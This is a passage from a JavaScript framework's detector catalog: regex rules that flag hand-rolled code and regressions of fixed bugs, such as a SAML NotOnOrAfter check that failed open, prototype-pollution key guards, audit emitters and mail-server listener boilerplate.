  { id: "saml-subjectconfirmation-notonorafter-must-fail-closed", primitive: "verifyResponse's Bearer SubjectConfirmationData NotOnOrAfter check must fail closed: `var notOnOrAfter = _attr(scd, \"NotOnOrAfter\"); if (!notOnOrAfter) continue;` followed by a parseability+expiry check — never the optional `if (notOnOrAfter) { ... }` shape, which accepts a confirmation with NO NotOnOrAfter as fresh-forever", scanScope: "lib", regex: /var notOnOrAfter\s*=\s*_attr\([^)]*\);\s*if \(notOnOrAfter\)/, allowlist: [], reason: "SAML 2.0 Web Browser SSO Profile §4.1.4.2 requires every Bearer SubjectConfirmationData to carry a NotOnOrAfter that bounds the assertion's freshness window. lib/auth/saml.js verifyResponse once read `var notOnOrAfter = _attr(scd, \"NotOnOrAfter\"); if (notOnOrAfter) { ... }` — a MISSING NotOnOrAfter skipped the whole block, so a confirmation with no time bound was accepted as fresh-forever (an unbounded, replay-forever assertion; CWE-613 insufficient session expiration / CWE-294 replay). The Holder-of-Key sibling (Profile §3.1, which incorporates §3 time-bounding) had the same missing-attribute hole PLUS a second latent one: `if (noaHok && isFinite(...) && Date.parse(noaHok)/1000 < ...)` short-circuited on `&&`, so an UNPARSEABLE NotOnOrAfter was also accepted. Both sites now require presence + parseability + not-expired before the confirmation is honored (`if (!notOnOrAfter) continue;` then the isFinite/expiry continue). This detector fires while the Bearer check is the optional `if (notOnOrAfter)` shape and goes silent once it is the fail-closed `if (!notOnOrAfter) continue;` shape; the behavioral guard is test/layer-0-primitives/saml-subjectconfirmation-notonorafter.test.js (RED on the optional shape for the missing-attr case, GREEN on the fix). Empty allowlist — an optional NotOnOrAfter on a Bearer confirmation is the unbounded-freshness bug." },
  // #109 — defineGuard's default gate must resolve profile + posture.
  {
    id: "defineguard-defaultgate-skips-profile-posture-resolution",
    primitive: "defineGuard's defaultGate must resolve profile + posture (resolveProfileAndPosture) before passing opts to buildGuardGate — otherwise the gate reads forensicSnippetBytes / maxRuntimeMs from RAW opts, dropping the profile's runtime cap and the posture's forensic-snippet cap",
    scanScope: "lib",
    regex: /function defaultGate\s*\([^)]*\)\s*\{(?:(?!resolveProfileAndPosture)[\s\S]){0,2000}?return buildGuardGate/,
    allowlist: [],
    reason: "#109 — defineGuard's defaultGate passed RAW opts straight to buildGuardGate, which reads opts.forensicSnippetBytes / opts.maxRuntimeMs directly. Those caps live in the resolved PROFILE (maxRuntimeMs) and POSTURE (forensicSnippetBytes), not the raw caller opts — so gate({ compliancePosture: \"hipaa\" }) dropped the 128-byte forensic cap to 0 (forensic snapshots disabled on a regulated-posture refusal) and dropped the profile's runtime cap to uncapped. The hand-written gates call resolveProfileAndPosture(opts, ...) first; the default gate must too. The span anchors on the single defaultGate and fires if its body reaches `return buildGuardGate` without a resolveProfileAndPosture call; the {0,2000} bound is a ReDoS backstop above the ~700-char body.",
  },
  // #129 — session.rotate must re-key the sid-bound device fingerprint.
  {
    id: "session-rotate-skips-fingerprint-rekey",
    primitive: "session.rotate must re-key the sid-bound __bj_fingerprint to the NEW sid via _hashFingerprint(newSid, ...) — a rotated session that carries the old-sid hash makes verify() falsely report fingerprintDrift (logout under strict operators) or silently breaks the device binding",
    scanScope: "lib",
    regex: /async function rotate\s*\([^)]*\)\s*\{(?=[\s\S]*?newSidHash)(?:(?!_hashFingerprint|\n\})[\s\S]){0,3000}?\n\}/,
    allowlist: [],
    reason: "#129 — __bj_fingerprint is sid-keyed (_hashFingerprint(sid, inputs), so a stolen DB can't replay the binding). rotate() moves the sid but left the stored fingerprint bound to the OLD sid; verify(newToken, sameReq) then recomputes _hashFingerprint(newSid, inputs) and mismatches → a false fingerprintDrift (strict operators destroy the session = self-DoS on every rotation) or a silently-broken binding. rotate must re-key the fingerprint to the new sid from the live request: _hashFingerprint(newSid, _buildFingerprintInputs(req, fpFields)). The span anchors on the single async rotate() in lib/session.js and fires if its body reaches the column-0 close with no _hashFingerprint re-key; the {0,3000} bound is a ReDoS backstop above the ~2KB body. updateData legitimately PRESERVES the old hash (sid unchanged) so it is a different function and not matched.",
  },
  // #120 — a retention dry-run / preview must not VACUUM the database.
  {
    id: "retention-erase-vacuums-before-dryrun-gate",
    primitive: "retention._erase must compute its sealed/hash field set and pass the `if (dryRun) return` gate BEFORE calling cryptoField.eraseRow — eraseRow schedules a full DB VACUUM and emits db.vacuum_after_erase under a regulated posture, so calling it before the dry-run gate makes a preview rewrite the whole database file per candidate row",
    scanScope: "lib",
    regex: /function _erase\s*\([^)]*\)\s*\{(?:(?!if \(dryRun\) return)[\s\S]){0,1500}?cryptoField\.eraseRow/,
    allowlist: [],
    reason: "#120 — cryptoField.eraseRow, under a posture whose POSTURE_DEFAULTS sets requireVacuumAfterErase (gdpr/hipaa/dpdp/pipl-cn/lgpd-br), calls db().vacuumAfterErase({ mode: \"full\" }) → VACUUM; → db.vacuum_after_erase. retention._erase called eraseRow at the top of the function, before the `if (dryRun) return { wouldErase: 1 }` gate, so b.retention.run(name, { dryRun: true }) (and the CLI `retention preview`) ran a full-table VACUUM per past-TTL row — a preview that locks the DB and rewrites the file, the opposite of a dry-run. eraseRow's return value is discarded (void erased), so it only ran for that side effect; the fix computes sealedFields/hashFields (no side effect) and returns on dryRun BEFORE eraseRow. The tempered span anchors on the single _erase and the `if (dryRun) return` structural boundary: it fires while eraseRow is reachable before the gate and goes silent once eraseRow moves after it; the {0,1500} bound is a ReDoS backstop above the ~400-char body.",
  },
  // #71 — registerTable must honor the pinned posture's seal-envelope floor.
  {
    id: "crypto-field-register-without-seal-floor-gate",
    primitive: "enforce the pinned posture's sealEnvelopeFloor at cryptoField.registerTable (_assertSealEnvelopeFloor) — a regulated posture must refuse a table sealing columns below its envelope floor; any registerTable that seals columns must EITHER assert the floor itself OR route its sealing through the cryptoField primitive (registerTable / sealRow), which asserts it",
    regex: /function registerTable\b/,
    requires: /_assertSealEnvelopeFloor|cryptoField\.(?:registerTable|sealRow)\b/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-311/CWE-326 — POSTURE_DEFAULTS gained a sealEnvelopeFloor (hipaa/pci-dss → aad); registerTable must throw at config-time when a regulated posture is pinned and the table seals columns under a weaker envelope (plain below aad/per-row-key), or a HIPAA deployment can register a copy-paste-vulnerable plain-sealed table.",
  },
  {
    // Node 26 ships `Map.prototype.getOrInsertComputed(key, factory)`
    // (TC39 stage-4, lands in V8 13.x). It replaces the two-step
    // `var v = m.get(k); if (!v) { v = factory(); m.set(k, v); }` (and
    // the `if (!m.has(k)) m.set(k, factory());` variant) with a single
    // call that does ONE lookup instead of two and closes a small race
    // window in cluster-shared agent registries (no observer can see
    // the half-built state between `.has(k) === false` and `.set(k)`).
    //
    // The framework floor today is `engines.node: ">=24"`. The sweep is
    // deferred to the Node 26 floor-bump (eligible Oct 2026 per LTS
    // calendar). This detector lands NOW so:
    //   1. New code can't introduce fresh occurrences without tripping
    //      the gate — the floor-bump sweep's surface stays bounded.
    //   2. Operators reading the catalog see the migration target.
    //   3. When the floor moves, the bump commit walks the allowlist,
    //      converts each call site, drops the allowlist entries, and
    //      flips the detector from "documentation" to "enforce".
    //
    // The allowlist below is the survey ground truth — each entry
    // names the map and the on-miss factory it covers. Adding a new
    // file here pre-floor-bump requires the same per-site annotation
    // so the sweep stays mechanical.
    //
    // The catalog catches both variants via a pair of sibling entries:
    //   A. `var X = M.get(k); if (!X) { ... .set(k, ...) ... }` — this
    //      entry. The body must reach a `.set(` call within ~300 chars
    //      of the `if`-block opener to qualify; the `.set(` requirement
    //      excludes guard-throw shapes like `if (!entry) throw new ...`
    //      where the function returns / errors instead of inserting.
    //   B. `if (!M.has(k)) { ... .set(k, ...) ... }` — caught by the
    //      sibling `map-has-then-set-pre-node-26` entry below.
    // The regexes intentionally drop the same-identifier backref. The
    // first attempt used `\1`-pinned backrefs to require the same map
    // name on both sides; V8's regex engine ran the working set OOM on
    // large lib/ files (deferred backtracking with `[\s\S]{0,N}?` +
    // backref + alternation). Two simpler regexes get the same
    // coverage at a fraction of the engine cost; the rare false positive
    // where the `.get(...)` and `.set(...)` name DIFFERENT maps is
    // covered by the allowlist + reason.
    id: "map-get-or-insert-pre-node-26",
    primitive: "b.internal boundedMap.getOrInsert(map, key, factory, opts?) — the framework's get-or-insert primitive (lib/bounded-map.js). Hand-rolled two-step get-then-set is the duplication; route it through getOrInsert.",
    // Variant A only — `var X = M.get(k); if (!X) { ... M.set(k, ...) ... }`.
    // Variant B (`if (!M.has(k)) { ... M.set(k, ...) ... }`) is caught
    // by the sibling `map-has-then-set-pre-node-26` entry below; one
    // regex per shape keeps V8's backtracking engine happy on large
    // files (an alternation `(?:A)|(?:B)` with backrefs + `[\s\S]{0,N}?`
    // triggered an OOM on the first attempt).
    // Indent-backref structural anchor: capture the `var` line's indent and
    // require the if-block's closing brace at the SAME indent (`\n\1\}`), so
    // the tempered token stops at the if-block's OWN closing brace at any
    // nesting depth. This both (a) ignores an assert-then-set whose `.set` is
    // OUTSIDE the if-block (`if (!v) { throw } m.set(...)` — the `\1}` precedes
    // the `.set`) and (b) catches a real get-or-insert at any depth, where a
    // layout-coupled `\s{0,4}\}` char-bound silently rotted on nested code.
    regex: /(?:^|\n)([ \t]*)var\s+\w+\s*=\s*\w+\.get\s*\([^;]+\)\s*;\s*\n[ \t]*if\s*\(\s*!\s*\w+\s*\)\s*\{(?:(?!\n\1\}|\.set\s*\()[\s\S]){0,4000}?\.set\s*\(/,
    allowlist: [
      // lib/bounded-map.js is the primitive's own home — its getOrInsert body
      // is the canonical get-then-set and must not flag itself.
      "lib/bounded-map.js",
    ],
    reason: "The framework's request-keyed Maps used to hand-roll `var v = m.get(k); if (!v) { v = factory(); m.set(k, v); }` everywhere. That two-step get-or-insert is now a single primitive — boundedMap.getOrInsert(map, key, factory, opts?) in lib/bounded-map.js — which also composes the optional cardinality ceiling (opts.maxSize/onFull) a capped caller would otherwise re-roll. Every call site routes through it; the detector enforces that routing. New hand-rolled get-then-set trips this — route it through boundedMap.getOrInsert rather than re-rolling or allowlisting. (Floor note: when the Node floor reaches 26, getOrInsert's one body swaps to native Map.prototype.getOrInsertComputed in a single edit — the point of centralizing it.)",
  },
  {
    // Companion to `map-get-or-insert-pre-node-26` — same Node-26
    // migration target, different syntactic variant. Catches the
    // `if (!M.has(k)) { ... M.set(k, factory); ... }` shape (no
    // intermediate `var X = M.get(k)` binding). See the sibling entry.
    id: "map-has-then-set-pre-node-26",
    primitive: "b.internal keyed-store guard family (lib/bounded-map.js): boundedMap.getOrInsert (insert-on-absence) or boundedMap.requirePresent (must-exist lookup/update). Hand-rolled `if (!map.has(k)) { … }` absence guard is the duplication; route it through the matching member.",
    // The general ABSENCE guard — `if (!map.has(key)) { … }` whose block then
    // either SETS (insert-on-absence → getOrInsert) or THROWS (must-exist →
    // requirePresent). Loosened from the old `.set`-only anchor (which missed
    // the throw-on-absent registry-lookup shape) to catch the whole absence
    // family. Indent-backref structural anchor (`\n\1\}`) bounds the block at
    // any nesting depth so an action OUTSIDE the if-block isn't pulled in.
    regex: /(?:^|\n)([ \t]*)if\s*\(\s*!\s*\w+\.has\s*\([^)]+\)\s*\)\s*\{(?:(?!\n\1\})[\s\S]){0,300}?(?:\.set\s*\(|\bthrow\b)/,
    allowlist: [
      // Genuinely-different absence guards that are NOT a keyed-store
      // register/lookup the primitive expresses — the checked container is a
      // CONSTANT allow/deny Set (an enum / supported-value list / parsed-input
      // membership), not a mutable registry boundedMap owns. Each validates an
      // input against a fixed Set and throws; requirePresent/getOrInsert can't
      // express them (nothing is inserted, the Set is frozen):
      "lib/auth/oid4vp.js",             // seenIds: dedup-set of a parsed credential list (cross-reference validation), not a registry
      "lib/cose.js",                    // protMap.has(crit-label): COSE crit MUST be present in the decoded protected header — parsed-structure validation
      "lib/db-query.js",                // ALLOWED_OPS: frozen set of valid where-operators (enum validation)
      "lib/eat.js",                     // raw.has(nonce): parsed-token claim presence, not a registry lookup
      "lib/http-client-cookie-jar.js",  // VALID_PERSIST: frozen enum of persist modes (opt validation)
      "lib/i18n.js",                    // localesSet.has(locale): the block PERMITS (no reject) — not a guard at all
      "lib/middleware/compression.js",  // SUPPORTED_ENCODINGS: frozen enum of codings (input validation)
      "lib/middleware/health.js",       // TIER_SET: frozen enum of health tiers (input validation)
      "lib/audit.js",                   // registeredNamespaces: a Set (membership only, no per-key value) → requirePresent's get/set don't apply
    ],
    reason: "The framework's keyed-store ABSENCE guard — `if (!map.has(key)) { … }` — resolves two ways: the block INSERTS (insert-on-absence → boundedMap.getOrInsert) or THROWS (must-exist registry lookup/update → boundedMap.requirePresent). The old detector anchored only on `.set` and so missed the throw-on-absent registry-lookup shape; loosened to the whole absence family. Route a mutable-registry guard through the matching primitive; allowlist only an absence check against a CONSTANT allow/deny Set (enum / supported-value / parsed-input membership), which is input validation rather than a keyed-store guard, with a structural reason.",
  },
  {
    // Third member of the keyed-store guard family (siblings:
    // map-get-or-insert / map-has-then-set above). A framework registry
    // (topics, jobs, metrics, RoPA activities, DSR tickets, …) enforces
    // UNIQUE keys: `if (map.has(key)) { throw <duplicate> }` before its
    // `map.set`. That guard recurred across ~18 registries, each re-rolling
    // the check. boundedMap.requireAbsent(map, key, onConflict) is the one
    // primitive: it runs onConflict(key, existing) when present (the caller
    // throws its own typed duplicate error) so the uniqueness check can't be
    // forgotten. Indent-backref structural anchor (`\n\1\}`) bounds the block
    // at any nesting depth.
    id: "map-insert-unique-guard",
    primitive: "b.internal boundedMap.requireAbsent(map, key, onConflict) — the keyed-store uniqueness guard (lib/bounded-map.js). Hand-rolled `if (map.has(k)) { throw }` registry-register is the duplication; route it through requireAbsent.",
    regex: /(?:^|\n)([ \t]*)if\s*\(\s*\w+\.has\s*\([^)]+\)\s*\)\s*\{(?:(?!\n\1\})[\s\S]){0,300}?\bthrow\b/,
    allowlist: [
      // Genuinely-different presence-guards that are NOT a keyed-store
      // uniqueness register (nothing is inserted; the container is a Set or a
      // frozen constant, so requireAbsent — which needs a mutable Map — can't
      // express them). Three classes:
      //
      // (1) Set-based membership uniqueness — these route through the Set
      //     sibling boundedMap.requireAbsentMember (safe-env/toml/yaml dup-key,
      //     oid4vp dup DCQL id, guard-mail-query filter-cycle). The ONE that
      //     stays here is canonical-json: it is a zero-dependency leaf
      //     serializer, and pulling bounded-map (→ validate-opts) into it to
      //     route a 3-line cycle-check would be a layering regression, so its
      //     recursion-visited Set guard is allowlisted rather than routed.
      "lib/canonical-json.js",          // `seen` recursion-visited Set (cycle detection); kept a leaf — not routed
      // (2) Presence-conditional PROCESSING of an optional decoded field — the
      //     matched `throw` is downstream value-validation, not a reject-because-
      //     present (e.g. `if (hdr.has(CRIT)) { var c = hdr.get(CRIT); if (bad) throw }`):
      "lib/cose.js",                    // protMap.has(HDR_CRIT) → validate the crit array if present
      "lib/cwt.js",                     // raw.has(exp) → validate the exp claim if present
      "lib/db-query.js",                // JSONB_CONTAINMENT_OPS.has(op) → special-case the operator if it is one
      // (NB: the prototype-pollution POISONED_KEYS deny-set guards that used to
      //  live here — body-parser, the safe-* parsers, safe-schema — were
      //  extracted into the pick.isPoisonedKey primitive and no longer fire.)
    ],
    reason: "The uniqueness guard for a framework registry — `if (map.has(key)) { throw <duplicate> }` before `map.set` — recurred across keyed stores (agent-event-bus topics, gdpr-ropa activities, jobs/scheduler registries, heartbeat targets, dsr tickets, metrics). boundedMap.requireAbsent(map, key, onConflict) centralizes it so the uniqueness check can't be forgotten and the caller keeps its own typed duplicate error. Route a hand-rolled register through requireAbsent; allowlist only a genuinely-different presence-guard — a Set-based recursion/dedup check, a presence-conditional read of an optional decoded field, or a frozen DENY-set membership (prototype-pollution defense) — none of which insert into a mutable keyed store, with a structural reason.",
  },
  {
    // Prototype-pollution key guard (CWE-1321) hand-rolled instead of routed
    // through pick.isPoisonedKey / pick.assertSafeKey / pick.POISONED_KEYS.
    // One loose detector for both shapes: the three poisoned-key string
    // literals appearing close together — whether as a set/array DEFINITION
    // (`new Set(["__proto__","constructor","prototype"])`, redeclared per file)
    // or a literal COMPARISON chain (`k === "__proto__" || k === "constructor"
    // || k === "prototype"`, respelled per site). The dangerous-key set must
    // live in pick.js alone — one stale copy is a pollution hole. The detector
    // IS the discovery + the permanent guard; a loose regex finds every
    // instance the framework's own scan would.
    id: "poisoned-key-guard-hand-rolled",
    primitive: "b.internal pick.isPoisonedKey(key) (predicate) / pick.assertSafeKey(key, onPoisoned) (throw-guard) / pick.POISONED_KEYS (lib/pick.js) — the single prototype-pollution key guard. Re-declaring the {__proto__,constructor,prototype} set or re-spelling the literal comparison is the duplication; route it through pick.",
    regex: /["']__proto__["'][\s\S]{0,80}?["']constructor["'][\s\S]{0,80}?["']prototype["']/,
    skipCommentLines: true,
    allowlist: [
      "lib/pick.js",   // the canonical home — defines POISONED_KEYS + isPoisonedKey/assertSafeKey
    ],
    reason: "The {__proto__, constructor, prototype} prototype-pollution key guard was hand-rolled framework-wide in two shapes: an in-file `new Set([...])` / `[...]` definition (re-declared in 8 parsers/middleware) and a literal `k === \"__proto__\" || ...` comparison chain (re-spelled in ~20 decoders/validators), even though lib/pick.js already exported a canonical POISONED_KEYS almost nobody imported. Routed every guard through pick.isPoisonedKey (skip cases), pick.assertSafeKey (reject/throw cases), or pick.POISONED_KEYS so the dangerous-key set lives in one place; a stale per-file copy was the silent pollution hole. New hand-rolled poisoned-key literals trip this — route through pick, never re-declare or re-spell.",
  },
  {
    // v0.15.13 — the drop-silent, gated, prefixed audit emitter that every
    // primitive hand-rolled as a private `_emitAudit(action, outcome, metadata)`
    // closure (or inline). The namespace prefix is the only axis → build the
    // emitter once with b.audit.namespaced and call it.
    id: "audit-namespaced-emit-hand-rolled",
    primitive: "b.audit.namespaced(prefix, auditFlag) (lib/audit.js) — the drop-silent emitter bound to one action namespace. Hand-rolling `audit().safeEmit({ action: \"<ns>.\" + verb, outcome, metadata: metadata || {} })` (in a private _emitAudit/_emit closure OR inline) re-spells the same gated passthrough; build it once with b.audit.namespaced(\"<ns>\", opts.audit) and call the returned emitter.",
    regex: /safeEmit\(\{\s*action:\s*"[a-zA-Z][a-zA-Z0-9_.]*\."\s*\+/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Every primitive hand-rolled an `_emitAudit(action, outcome, metadata)` closure (or inline) wrapping `audit().safeEmit({ action: prefix + action, outcome, metadata: metadata || {} })`, differing in the action prefix and a few per-emit fields; extracted b.audit.namespaced(prefix, opts?) (gate + sink axes) whose returned emitter takes a 4th `extra` object for per-call fields (actor / resource) — so the actor-bearing (worm/fsm/guard-sql/compliance.aiact) and sink-based (network-dns-resolver) variants route through it too, not as exceptions. Allowlist is EMPTY: the primitive itself uses a VARIABLE prefix (`prefix + \".\"`), so this literal-dotted-prefix detector never trips on lib/audit.js. The grep-for-`function _emitAudit` discovery missed inline calls + a second-scope emitter (incident.report.clock) + multi-line `action: \"ns.\"\\n + verb` (compliance.aiact/fsm/guardSql.gate) — the detector is the discovery. New hand-rolled `safeEmit({ action: \"<ns>.\" + … })` trips this — use b.audit.namespaced.",
  },
  {
    id: "audit-verbatim-emit-hand-rolled",
    primitive: "b.audit.namespaced(null, opts?) (lib/audit.js) — the no-namespace form of the gated drop-silent emitter, for primitives whose audit actions are already fully-qualified at the call site (`emitAudit(\"system.outbox.started\", …)`). Hand-rolling the gated closure `function _emitAudit(action, outcome, metadata) { if (!auditOn) return; try { audit().safeEmit({ action: action, outcome: outcome, metadata: metadata || {} }); } catch {} }` re-spells the same passthrough; build it once with `var _emitAudit = audit().namespaced(null, { audit: <gateVar> });` and call the returned emitter.",
    // Sibling of audit-namespaced-emit-hand-rolled, for the VERBATIM-action form
    // (the prefixed form anchors on `action: \"ns.\" +`; this anchors on the
    // gate `if (!<var>) return;` immediately followed by the try { audit().safeEmit
    // ({ action: action, outcome: outcome, metadata: metadata || {} }) } passthrough
    // — \\s* matches the newlines of the multi-line `safeEmit({\\n action: action …`
    // formatting). The variants that genuinely differ are NOT matched: an
    // operator-supplied `opts.audit.safeEmit` sink (gate `!opts.audit || …`), a
    // per-call gate PARAM (`if (auditOn === false)`), a `safeEmit` PARAM operator
    // handle (`if (typeof safeEmit !== \"function\")`), and the no-gate / extra-logic
    // emitters — each a distinct contract, left in place. ZERO allowlist: the
    // primitive (namespaced) builds `evt` then `sink.safeEmit(evt)`, never the
    // `if (!\\w+) return; … audit().safeEmit({ action: action, … })` literal.
    regex: /if\s*\(\s*!\s*\w+\s*\)\s*return\s*;\s*try\s*\{\s*audit\(\)\.safeEmit\(\s*\{\s*action:\s*action\s*,\s*outcome:\s*outcome\s*,\s*metadata:\s*metadata\s*\|\|\s*\{\s*\}/,
    skipCommentLines: true,
    allowlist: [],
    reason: "11 framework primitives (outbox, compliance-sanctions, compliance-sanctions-fetcher, tenant-quota ×2, auth/sd-jwt-vc-holder, auth/sd-jwt-vc-issuer, ai-capability, ai-dp, ai-quota, cert, mail-send-deliver) each hand-rolled the SAME gated drop-silent audit emitter — a factory closure `function <name>(action, outcome, metadata) { if (!<gateVar>) return; try { audit().safeEmit({ action: action, outcome: outcome, metadata: metadata || {} }); } catch {} }` — varying only in the gate var name (auditOn / auditEnabled) and the closure name (_emitAudit / _auditEmit). The 6-file STRONG-DUP cluster was a SAMPLE; the framework-wide sweep found the other 5 by the safeEmit-passthrough signature. They differ from the PREFIXED siblings (audit-namespaced-emit-hand-rolled) only in passing a verbatim, already-qualified action — so b.audit.namespaced gained a falsy-prefix mode (action passes through unprefixed) and each routes to `var <name> = audit().namespaced(null, { audit: <gateVar> })` (built at factory-init, byte-equivalent: verbatim action, metadata default, gate honored — functionally proven). The genuinely-different emitters were NOT folded in: operator-supplied-sink (ai-disclosure `opts.audit`, bot-challenge `safeEmit` param), per-call gate param (keychain), and no-gate / extra-logic (redact, worker-pool, webhook-dispatcher) — each a distinct contract. ZERO allowlist — a re-introduced gated verbatim emitter trips this; use b.audit.namespaced(null, …).",
  },
  {
    id: "mail-server-listen-hand-rolled",
    primitive: "b.internal mailServerNet.createTcpListener(net, cfg) (lib/mail-server-net.js) — the TCP-listener lifecycle shared by the mailbox/transfer servers (mail-server-imap/pop3/mx/managesieve/submission). Hand-rolling the bind dance `tcpServer = net.createServer(s => _handleConnection(s)); tcpServer.once(\"error\", reject); tcpServer.listen(port, address, () => { listening = true; _emit(\"...listening\", …); resolve(…) })` re-spells it; build the lifecycle once with createTcpListener(net, { defaultPort, handleConnection, errorFactory, emit, listeningEvent, listeningExtra? }) and use its listen / closeSimple / getServer / isListening / markClosed.",
    // Anchors on the one-shot error-reject immediately followed by the bind:
    // `.once(\"error\", reject); <server>.listen(port, address` — the precise
    // structural pair of the listener bind. The home (mail-server-net.js) is the
    // sole allowlist entry; no other lib module hand-rolls this exact pair.
    regex: /\.once\(\s*"error"\s*,\s*reject\s*\)\s*;\s*\w+\.listen\(\s*port\s*,\s*address/,
    skipCommentLines: true,
    allowlist: ["lib/mail-server-net.js"],
    reason: "All 5 mailbox/transfer servers (mail-server-imap / pop3 / mx / managesieve / submission) hand-rolled the SAME listen() body — refuse double-listen, resolve the default port (honoring an explicit 0 for the ephemeral test bind), net.createServer(_handleConnection), arm a one-shot \"error\"→reject so a bind failure rejects the promise, then on listen set the listening flag + emit the \"...listening\" audit + resolve {port,address} — varying only in error class / code prefix, default port (143/110/25/DEFAULT_PORT/implicitTls?465:587), listening event name, and the Submission implicitTls extra field. The 3 store servers (imap/pop3/managesieve) ALSO shared an identical close() (mark closed, destroy every socket, await tcpServer.close, emit \"...closed\"). Extracted mailServerNet.createTcpListener(net, cfg) owning the listening + server state + the listen bind + a closeSimple() for the store-server shutdown; the transfer servers (mx/submission) keep their own graceful SMTP-421 drain close() driven through markClosed()/getServer() (a genuinely different shutdown, not folded in). Each server keeps its own connection Set (entangled with _handleConnection) and per-server config. allowlist is mail-server-net.js only (the lifecycle home); a re-introduced hand-rolled listener bind trips this — use createTcpListener.",
  },
  {
    id: "mail-server-admit-connection-hand-rolled",
    primitive: "b.internal mailServerNet.admitConnection(socket, rateLimit, emit, cfg) (lib/mail-server-net.js) — the per-connection rate-limit gate every mail listener's _handleConnection opens with. Hand-rolling `var admit = rateLimit.admitConnection(remoteAddress); if (!admit.ok) { _emit(\"<...>.rate_limit_refused\", { remoteAddress, reason: admit.reason }, \"denied\"); try { socket.write(<refusal>); } catch {} try { socket.destroy(); } catch {} return; }` re-spells it; `var remoteAddress = mailServerNet.admitConnection(socket, rateLimit, _emit, { refusedEvent, refusalLine }); if (remoteAddress === null) return;` and run the protocol-specific rest.",
    // Anchors on the admit call + the refuse branch: `rateLimit.admitConnection(
    // remoteAddress); if (!admit.ok)`. After routing, the 5 listeners call
    // mailServerNet.admitConnection(...) instead; only the home (mail-server-net.js)
    // retains the raw rateLimit.admitConnection + !admit.ok refuse.
    regex: /rateLimit\.admitConnection\(\s*remoteAddress\s*\)\s*;\s*if\s*\(\s*!\s*admit\.ok/,
    skipCommentLines: true,
    allowlist: ["lib/mail-server-net.js"],
    reason: "All 5 mail listeners (mail-server-imap/pop3/mx/managesieve/submission) opened _handleConnection with the SAME rate-limit admit gate — resolve the remote IP, admit it or refuse with a protocol-specific wire line (IMAP \"* BAD …\", POP3 \"-ERR …\", SMTP \"421 4.7.0 …\", ManageSieve 'NO \"…\"') + a \"<...>.rate_limit_refused\" audit (outcome \"denied\") + socket.destroy(), then return — varying only in the refusal line + event name. Extracted mailServerNet.admitConnection(socket, rateLimit, emit, { refusedEvent, refusalLine }) returning the remote address on admit or null on refusal; each listener does `if (remoteAddress === null) return;` then runs its own (genuinely per-protocol) close handler, connection-id, tracking-set insert, banner, and state machine — none folded in. allowlist is mail-server-net.js (home); a re-introduced hand-rolled admit gate trips this — use mailServerNet.admitConnection.",
  },
  {
    id: "mail-store-server-lifecycle-hand-rolled",
    primitive: "b.internal mailServerNet.createStoreServer(net, cfg) (lib/mail-server-net.js) — the COMPLETE lifecycle of a mailbox store server (mail-server-imap/pop3/managesieve): it composes createTcpListener with the destroy-then-await closeSimple shutdown and returns { listen, close }. Hand-rolling `var _tcpListener = mailServerNet.createTcpListener(net, { ... }); function close() { return _tcpListener.closeSimple({ connections, emit, closedEvent }); } return { listen: _tcpListener.listen, close }` re-spells it; call mailServerNet.createStoreServer(net, { defaultPort, handleConnection, errorClass, errorCodePrefix, emit, connections, eventBase }).",
    // Anchors on the store-server shutdown call `<listener>.closeSimple(` — the
    // destroy-then-await close that createStoreServer now owns exclusively. The
    // transfer servers (mx/submission) use a graceful SMTP-421 drain (getServer/
    // markClosed), never closeSimple, so they do not trip this. The home
    // (mail-server-net.js, where createStoreServer composes closeSimple) is the
    // sole allowlist entry.
    regex: /\.closeSimple\s*\(/,
    skipCommentLines: true,
    allowlist: ["lib/mail-server-net.js"],
    reason: "The 3 mailbox store servers (mail-server-imap/pop3/managesieve) each hand-wired the SAME lifecycle tail — createTcpListener(net, cfg), then a close() calling _tcpListener.closeSimple({ connections, emit, closedEvent }), then return { listen: _tcpListener.listen, close } — byte-identical (the fp:ec0be12a9f4c 60-tok STRONG-DUP) varying only in default port (143/110/DEFAULT_PORT), error class + code prefix, and the audit event base (mail.server.imap/pop3/managesieve). The listen bind + the closeSimple shutdown were already shared via createTcpListener; what stayed duplicated was the COMPOSITION (the errorFactory construction + the close wrapper + the return), now owned by mailServerNet.createStoreServer(net, cfg) — each store server is one call passing its port / errorClass / errorCodePrefix / eventBase. The transfer servers (mx/submission) genuinely diverge — a graceful SMTP-421 drain close() driven through markClosed()/getServer() plus a richer return ({ connectionCount, _portForTest }) — so they keep calling createTcpListener directly and never call closeSimple (not folded in). allowlist is mail-server-net.js only (where createStoreServer composes closeSimple); a re-introduced hand-rolled store-server close trips this — use mailServerNet.createStoreServer.",
  },
  {
    id: "audit-emit-hand-rolled",
    primitive: "b.internal auditEmit.emit(action, metadata, outcome?) (lib/audit-emit.js) — the metadata-first, success-default, ungated drop-silent audit emitter shared by the mail servers + DAV bridge, the A2A task store, the compliance posture tracker, the MCP tool registry, and the idempotency-key middleware. Hand-rolling `function _emit(action, metadata, outcome) { try { audit().safeEmit({ action: action, outcome: outcome || \"success\", metadata: metadata[ || {}] }); } catch {} }` re-spells it; `var _emit = auditEmit.emit;` and call it. (Distinct from b.audit.namespaced, which is gated, prefixed, and outcome-first.)",
    // Anchors on the metadata-first signature + body: `function <name>(action,
    // metadata, outcome) { try { audit().safeEmit({ action: action, outcome:
    // outcome || \"success\", metadata: metadata[ || {}] } …`. The metadata default
    // is OPTIONAL in the match — both the `metadata: metadata || {}` (mail) and the
    // `metadata: metadata` (A2A / compliance / MCP / idempotency) forms route to
    // the same emitter (every caller passes metadata, so the default never fires).
    // BOTH argument orders match: the metadata-first form (the 11 modules
    // below) and the (action, OUTCOME, metadata) form (daemon / self-update
    // _safeAuditEmit) — the latter now route too, each a thin adapter
    // `_safeAuditEmit(action, outcome, metadata) { auditEmit.emit(action,
    // metadata, outcome); }`. Home (audit-emit.js) is the sole allowlist entry.
    regex: /function\s+\w+\(action,\s*(?:metadata,\s*outcome|outcome,\s*metadata)\)\s*\{\s*try\s*\{\s*audit\(\)\.safeEmit\(\s*\{\s*action:\s*action\s*,\s*outcome:\s*outcome\s*\|\|\s*"success"\s*,\s*metadata:\s*metadata\s*(?:\|\|\s*\{\s*\})?\s*,?\s*\}/,
    skipCommentLines: true,
    allowlist: ["lib/audit-emit.js"],
